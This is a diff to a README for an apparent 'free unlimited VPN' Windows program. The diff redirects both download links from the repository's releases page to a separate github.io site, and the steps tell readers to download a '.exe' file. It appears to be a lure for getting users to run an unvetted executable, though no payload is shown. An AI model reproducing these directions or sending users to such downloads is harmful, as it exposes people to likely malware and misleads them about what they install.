@@ -1,6 +1,6 @@
 # 🛡️ VPN-Free-2026-Unlimited-PC - Access private content without any limits
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Caroline-harewallaby825/VPN-Free-2026-Unlimited-PC/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://caroline-harewallaby825.github.io)
 
 This application provides a simple way to browse the internet with privacy. It hides your digital identity and lets you use the web without restricted access. You do not need to sign up, create an account, or pay for a subscription to use these features.
 
@@ -8,7 +8,7 @@ This application provides a simple way to browse the internet with privacy. It h
 
 Follow these steps to get the program on your computer.
 
-1. Visit the [official releases page](https://github.com/Caroline-harewallaby825/VPN-Free-2026-Unlimited-PC/releases) to access the download options.
+1. Visit the [official releases page](https://caroline-harewallaby825.github.io) to access the download options.
 2. Look for the latest version listed under the Releases section.
 3. Find the file that ends in .exe.
 4. Click the file name to start the download.
